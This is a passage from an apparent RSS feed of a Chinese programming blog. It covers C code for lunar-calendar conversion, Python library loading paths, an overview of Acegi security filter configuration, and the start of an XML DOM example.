else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; daysPerMonth=30;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; day = bySolar + 1;<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; else {//阳历日在春节前<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bySpring -= bySolar;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; year--;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; month = 12;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ( ((lunar200y[year - 1901] &amp; 0xF00000) &gt;&gt; 20) == 0)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; index = 12;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; index = 13;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; flag = 0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( ( lunar200y[year - 1901] &amp; (0x80000 &gt;&gt; (index-1)) ) ==0)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; daysPerMonth = 29;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; daysPerMonth = 30;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(bySpring &gt; daysPerMonth) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bySpring -= daysPerMonth;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; index--;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(flag == 0)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; month--;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(month == ((lunar200y[year - 1901] &amp; 0xF00000) &gt;&gt; 20))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; flag = ~flag;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( ( lunar200y[year - 1901] &amp; (0x80000 &gt;&gt; (index-1)) ) ==0)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; daysPerMonth = 29;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; daysPerMonth = 30;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; day = daysPerMonth - bySpring + 1;<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; lunar.day = day;<BR>&nbsp;&nbsp;&nbsp; lunar.month = month;<BR>&nbsp;&nbsp;&nbsp; lunar.year = year;<BR>&nbsp;&nbsp;&nbsp; if(month == ((lunar200y[year - 1901] &amp; 0xF00000) &gt;&gt; 20))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lunar.reserved = 1;<BR>&nbsp;&nbsp;&nbsp; else<BR>&nbsp;lunar.reserved = 0;<BR>&nbsp;&nbsp;&nbsp; return lunar;<BR>}</P>  <P>int main(int argc, char*argv[])<BR>{<BR>&nbsp;&nbsp;&nbsp; const char *ChDay[] = {"*","初一","初二","初三","初四","初五",<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "初六","初七","初八","初九","初十",<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "十一","十二","十三","十四","十五",<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "十六","十七","十八","十九","二十",<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "廿一","廿二","廿三","廿四","廿五",<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "廿六","廿七","廿八","廿九","三十"};<BR>&nbsp;&nbsp;&nbsp; const char *ChMonth[] = {"*","正","二","三","四","五","六","七","八","九","十","十一","腊"};<BR>&nbsp;&nbsp;&nbsp; long t;<BR>&nbsp;&nbsp;&nbsp; int year,month,day;<BR>&nbsp;&nbsp;&nbsp; char str[13] = "";<BR>&nbsp;&nbsp;&nbsp; hjz osolar={<BR>&nbsp;.year = 2010,<BR>&nbsp;.month = 2,<BR>&nbsp;.day = 14,<BR>&nbsp;&nbsp;&nbsp; };<BR>&nbsp;&nbsp;&nbsp;&nbsp; hjz lunar = toLunar(osolar);<BR>&nbsp;&nbsp;&nbsp; hjz olunar = {<BR>&nbsp;.year = 2009,<BR>&nbsp;.month&nbsp; = 5,<BR>&nbsp;.day = 17,<BR>&nbsp;.reserved=1, //1表示闰月,0表示平月<BR>&nbsp;&nbsp;&nbsp; };</P>  <P>&nbsp;&nbsp;&nbsp; hjz solar = toSolar(olunar);</P>  <P>&nbsp;&nbsp;&nbsp; printf("Solar: %d-%d-%d\n",osolar.year,osolar.month,osolar.day);<BR>&nbsp;printf("=&gt;Lunar: %d-%d-%d\n",lunar.year,lunar.month,lunar.day);<BR>&nbsp;&nbsp;&nbsp; printf("Lunar: %d-%d-%d\n",olunar.year,olunar.month,olunar.day);<BR>&nbsp;&nbsp;&nbsp; printf("=&gt;Solar: %d-%d-%d\n",solar.year,solar.month,solar.day);<BR>&nbsp;&nbsp;&nbsp; return 0;<BR>}<BR></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>C/C++</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009111004626247/</guid>
    </item>
    <item>
      <title>
<![CDATA[python的类库加载机制]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720096218432287/</link>
      <description>
<![CDATA[打印机管理窗口不能打开，从命令行下打开时发现错误，原来gtk-2.0的路径没有在sys.path下，于是查看python的类库加载机制，最后发现是/usr/lib/python2.5/site-packages/python-support.pth中缺少两行<br>/var/lib/python-support/python2.5<br>gtk-2.0<br>/var/lib/python-support/python2.5/gtk-2.0<br>想起来是当时为了解决一个python冲突问题，从一个没有GUI的电脑上拷贝的python文件。于是加上这两行，问题解决。<br><br>1.查看Python从哪里加载类库<br>python<br>imp<wbr>ort sys<br>sys.path<br>2. 查看某个模块的文件路径<br>imp<wbr>ort urllib<br>urllib.__file__<br>3. python的类库加载机制<br>python -v<br>首先加载site.py<br>在site.py中， 首先加入site-packages，然后读该目录下的pth文件<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720096218432287/</guid>
    </item>
    <item>
      <title>
<![CDATA[Acegi设计概述[转]]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720071019115637612/</link>
      <description>
<![CDATA[<H2 >1. 简单叙述认证授权流程</H2>  <P>第一步, 认证(authentication)。Acegi调用AuthenticationManager(认证管理器)来对当前请求登陆系统用户进行验证，AuthenticationManager负责委托一个或多个Provider(认证提供者)，并逐一遍历每个Provider，直到某一个Provider能够成功的验证用户的身份。Provider成功验证用户身份后，会返回一个Authentication(证明), Authentication中包括Principal(用户名)，Credentials(通常是密码)，Authorities(该用户所拥有的权限)。这样就完成了身份验证的步骤。</P>  <P>第二步，授权(authorization)。当Acegi获得Authentication后，也就确定了用户的身份。每当用户请求访问某受保护资源时，Acegi会调用AccessDecisionManager(访问决策管理器)来决定用户的Authentication是否有恰当的权限来访问当前访问的受保护资源，有则授权用户通过，无则抛出错误信息，以达到访问控制的目的。</P>  <H2><A rel="nofollow" ></A>&nbsp;2. 安全保护方式</H2>  <UL>  <LI>保护Web应用程序<BR>当去保护Web应用程序时，Acegi使用Servlet Filter来拦截Servlet请求，并将这些请求转给AuthenticationManager，AccessDecisionManager或其他管理器来处理。 <BR clear="all" >Acegi提供了多个各种功能的Filter, 这些Filter按照先后顺序组成了一个 Filter Chain。当一个请求被提交道一个由Acegi所保护的Web应用程序时，该请求会按照如下顺序逐一通过Filter Chain： <BR clear="all" >&nbsp; <BR clear="all" >第一步， 请求通过ChannelProcessingFilter(通道处理过滤器，可选)。该过滤器负责检查当前请求的Channel，并判断是否已满足安全需要。如果不满足，则由非安全的通道传输(Http)重定向于安全的通道传输(Https)，以确保服务器与浏览器之间传输的数据加密。 <BR clear="all" >&nbsp; <BR clear="all" >第二步，请求通过 AuthenticationProcessingFilter(认证处理过滤器)。该过滤器会判断该请求是否是一个认证请求(通常是"/j_acegi_security_check")。如果是，则它会从请求中获取用户名和密码，并转交给AuthenticationManager来认证用户身份。如果不是，则会直接转到下一个Filter。 <BR clear="all" >&nbsp; <BR clear="all" >第三步，请求通过HttpSessionContextIntegrationFilter(HttpSession安全上下文信息集成过滤器)。该过滤器负责将Authentication对象保存在HttpSession中，使其在下一个请求到来时仍可被获取。故Authentication能跨越多个请求。 <BR clear="all" >&nbsp; <BR clear="all" >第四步，请求通过FilterSecurityInterceptor(过滤器安全拦截器)。该过滤器会首先调用AuthenticationManager判断用户是否已登陆认证，如还没认证成功，则重定向到登陆界面。认证成功，则并从Authentication中获取用户的权限。然后从objectDefinitionSource属性获取各种URL资源所对应的权限。最后调用AccessDecisionManager来判断用户所拥有的权限与当前受保华的URL资源所对应的权限是否相匹配。如果匹配失败，则返回403错误(禁止访问)给用户。匹配成功则用户可以访问受保护的URL资源。   </LI><LI>&nbsp;保护方法调用<BR>当去保护方法调用时，Acegi使用Spring AOP,将"切面"应用于所代理的对象，以确保用户只有在拥有恰当授权时才可以调用受保护的方法。<BR>MethodSecurityInterceptor(方法调用安全拦截器)同样也是在调用方法之前，先调用AuthenticationManager判断用户身份是否已验证，然后从objectDefinitionSource中获取方法所对应的权限，再调用AccessDecisionManager来匹配用户权限和方法对应的权限。如果用户没有足够权限调用当前方法，则抛出AccessDeniedException使方法不能被调用。 </LI></UL>  <H2><A rel="nofollow" ></A>&nbsp;3.过滤器链代理</H2>  <P>Acegi的FilterChainProxy提供了一种很好的方式，使你不需要在web.xml配置Filters,而在Spring配置文件中加入, 从而能充分利用Spring IOC的优势。</P>  <P>FilterChainProxy其实也只是一个扩展后的Filter，它负责委托Spring中的各个实现了javax.servlet.Filter接口的Bean来执行过滤功能。 如httpSessionContextIntegrationFilter， authenticationProcessingFilter， filterInvocationInterceptor等。</P>  <P>在web.xml中的配置FilterToBeanProxy:</P>  <P style="COLOR: #99ccff; BACKGROUND-COLOR: #ffffff;"  ><FONT color="#008080" ><SPAN style="COLOR: #99ccff;"  ><FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >filter</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >filter-name</FONT><FONT color="#008080" >&gt;</FONT><FONT color="#000000" >Acegi Filter Chain Proxy</FONT><FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >filter-name</FONT><FONT color="#008080" >&gt;|</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >filter-class</FONT><FONT color="#008080" >&gt;</FONT><FONT color="#000000" >org.acegisecurity.util.FilterToBeanProxy</FONT><FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >filter-class</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >init-param</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >param-name</FONT><FONT color="#008080" >&gt;</FONT><FONT color="#000000" >targetClass</FONT><FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >param-name</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >param-value</FONT><FONT color="#008080" >&gt;</FONT><FONT color="#000000" >org.acegisecurity.util.FilterChainProxy</FONT><FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >param-value</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >init-param</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >filter</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >filter-mapping</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >filter-name</FONT><FONT color="#008080" >&gt;</FONT><FONT color="#000000" >Acegi Filter Chain Proxy</FONT><FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >filter-name</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >url-pattern</FONT><FONT color="#008080" >&gt;</FONT><FONT color="#000000" >/*</FONT><FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >url-pattern</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >filter-mapping</FONT><FONT color="#008080" >&gt;</FONT></SPAN></FONT></P>  <P>在Spring配置文件中相应的FilterChainProxy Bean：</P>  <P style="BACKGROUND-COLOR: #ffffff;"  ><FONT color="#008080" ><SPAN style="COLOR: #99ccff;"  ><FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >bean</FONT> <FONT color="#7f007f" >id</FONT><FONT color="#000000" >=</FONT><FONT color="#2a00ff" >"filterChainProxy"</FONT><FONT color="#2a00ff" >&nbsp;</FONT> &nbsp;<FONT color="#7f007f" >class</FONT><FONT color="#000000" >=</FONT><FONT color="#2a00ff" >"org.acegisecurity.util.FilterChainProxy"</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >property</FONT> <FONT color="#7f007f" >name</FONT><FONT color="#000000" >=</FONT><FONT color="#2a00ff" >"filterInvocationDefinitionSource"</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >value</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#000000" >CONVERT_URL_TO_LOWERCASE_BEFORE_COMPARISON</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#000000" >PATTERN_TYPE_APACHE_ANT</FONT><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<FONT color="#000000" >/**=httpSessionContextIntegrationFilter,logoutFilter,authenticationProcessingFilter,securityContextHolderAwareRequestFilter, rememberMeProcessingFilter,anonymousProcessingFilter,exceptionTranslationFilter,filterInvocationInterceptor</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >value</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >property</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >bean</FONT><FONT color="#008080" >&gt;</FONT></SPAN></FONT></P>  <H2><A rel="nofollow" ></A>4. Acegi Exceptions 管理机制</H2>  <P>Acegi的异常管理机制做得不错，基本上可以满足权限管理需求。在其结构基础上继承实现自己的异常类也是很方便的。</P>  <P>所有Acegi的异常都是在 AcegiSecurityException 上继承而来的，其中最主要的是 AuthenticationException 和 AccessDeniedException。</P>  <P>这里需要注意的是 AcegiSecurityException 继承了Spring的 NestedRuntimeException，而NestedRuntimeException又是继承RuntimeException的。<BR>所以抛出的时候不需要throws,&nbsp;而捕捉的时候需要专门catch RuntimeException。</P>  <P>AuthenticationException 是所有授权相关的异常的父类，当用户身份验证失败时就会抛出这个异常。</P>  <P>AccessDeniedException 是所有认证相关的异常的父类，当资源被拒绝访问时就会抛出这个异常。</P>  <P><IMG title="Acegi设计概述[转] - hankjin - 云水居"  alt=""  src="http://wiki.springside.org.cn/download/attachments/1824/Acegi%20Exceptions%20Uml.JPG"  align="absMiddle" border="0" ></P>  <P>在Acegi 中，通过ExceptionTranslationFilter(异常转换过滤器)来对各种异常进行捕获和处理，并重定向到不同的错误信息显示页面。</P>  <P>如遇到AuthenticationException 就会重定向到登陆页面，遇到AccessDeniedException 就会无权访问资源页面。你还可以继承ExceptionTranslationFilter基础上覆盖handleException方法来实现你自己的系统中异常的处理。</P>  <P style="COLOR: #99ccff;"  ><SPAN style="BACKGROUND-COLOR: #ffffff;"  >&lt;<FONT color="#3f7f7f" >bean</FONT> <FONT color="#7f007f" >id</FONT>=<FONT color="#2a00ff" >"exceptionTranslationFilter"</FONT> <FONT color="#7f007f" >class</FONT>=<FONT color="#2a00ff" >"org.acegisecurity.ui.ExceptionTranslationFilter"</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >property</FONT> <FONT color="#7f007f" >name</FONT>=<FONT color="#2a00ff" >"authenticationEntryPoint"</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >bean</FONT> <FONT color="#7f007f" >class</FONT>=<FONT color="#2a00ff" >"org.acegisecurity.ui.webapp.AuthenticationProcessingFilterEntryPoint"</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >property</FONT> <FONT color="#7f007f" >name</FONT>=<FONT color="#2a00ff" >"loginFormUrl"</FONT> <FONT color="#7f007f" >value</FONT>=<FONT color="#2a00ff" >"/login.jsp"</FONT> <FONT color="#008080" >/&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >property</FONT> <FONT color="#7f007f" >name</FONT>=<FONT color="#2a00ff" >"forceHttps"</FONT> <FONT color="#7f007f" >value</FONT>=<FONT color="#2a00ff" >"false"</FONT> <FONT color="#008080" >/&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >bean</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >property</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >property</FONT> <FONT color="#7f007f" >name</FONT>=<FONT color="#2a00ff" >"accessDeniedHandler"</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >bean</FONT> <FONT color="#7f007f" >class</FONT>=<FONT color="#2a00ff" >"org.acegisecurity.ui.AccessDeniedHandlerImpl"</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;</FONT><FONT color="#3f7f7f" >property</FONT> <FONT color="#7f007f" >name</FONT>=<FONT color="#2a00ff" >"errorPage"</FONT> <FONT color="#7f007f" >value</FONT>=<FONT color="#2a00ff" >"/accessDenied.jsp"</FONT> <FONT color="#008080" >/&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >bean</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#000000" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> <FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >property</FONT><FONT color="#008080" >&gt;</FONT><BR><FONT color="#008080" >&lt;/</FONT><FONT color="#3f7f7f" >bean</FONT></SPAN></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720071019115637612/</guid>
    </item>
    <item>
      <title>
<![CDATA[xDOM跨平台之innerHTML&amp;innerhtml]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372008326111620119/</link>
      <description>
<![CDATA[IE和MF的XMLDOM有些不同，这里有个跨平台的库xDOM.js和detectBrowser.js，可以在google的codesearch里找到。<br>下面是一个使用XMLDOM的例子，需要注意的是，innerhtml和innerHTML不同。<br>一个xml+两个xslt+1个html<br><span style="text-decoration: underline; font-weight: bold; font-style: italic;">contacts.xml</span><br>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br>&lt;!-- This XML document describes a contacts list --&gt;<br>&lt;contacts&gt;<br>&nbsp;&nbsp;&nbsp; &lt;person id="9407001" type="supplier"&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;first_name&gt;John&lt;/first_name&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;last_name&gt;Smith&lt;/last_name&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;company&gt;Banana Computing&lt;/company&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;address1&gt;1 Fiction Street&lt;/address1&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;address2&gt;Imaginary Town&lt;/address2&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;country&gt;Strangeland&lt;/country&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;postal_code&gt;ABC 567&lt;/postal_code&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;last_contact&gt;2005-05-27&lt;/last_contact&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/person&gt;<br>&nbsp;&nbsp;&nbsp; &lt;person id="9407002" type="supplier"&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;first_name&gt;Hank&lt;/first_name&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;last_name&gt;Jin&lt;/last_name&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;company&gt;Banana Computing&lt;/company&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;address1&gt;1 Fiction Street&lt;/address1&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;address2&gt;Imaginary Town&lt;/address2&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;country&gt;Strangeland&lt;/country&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;postal_code&gt;ABC 567&lt;/postal_code&gt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &lt;last_contact&gt;2005-05-27&lt;/last_contact&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/person&gt;<br>&lt;/contacts&gt;<br><span style="font-weight: bold; font-style: italic; text-decoration: underline;">select.xslt<br></span>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br>&lt;xsl:stylesheet version="1.0" 